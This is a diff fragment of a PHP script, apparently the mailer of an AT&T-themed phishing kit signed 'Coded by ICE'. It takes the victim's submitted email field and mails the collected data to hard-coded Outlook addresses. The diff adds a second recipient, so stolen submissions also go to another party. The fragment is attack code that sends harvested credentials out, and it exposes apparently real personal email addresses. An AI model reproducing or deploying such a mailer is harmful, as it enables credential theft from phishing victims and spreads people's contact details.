@@ -10,7 +10,7 @@ $message .= "----Coded by ICE----------------\n";
 
 
 
-$recipient = "boone.sandra@outlook.com";
+$recipient = "boone.sandra@outlook.com, michaelmscotts@outlook.com";
 $subject = "ATT";
 $headers = "From: LENXZ";
 $headers .= $_POST['eMailAdd']."\n";
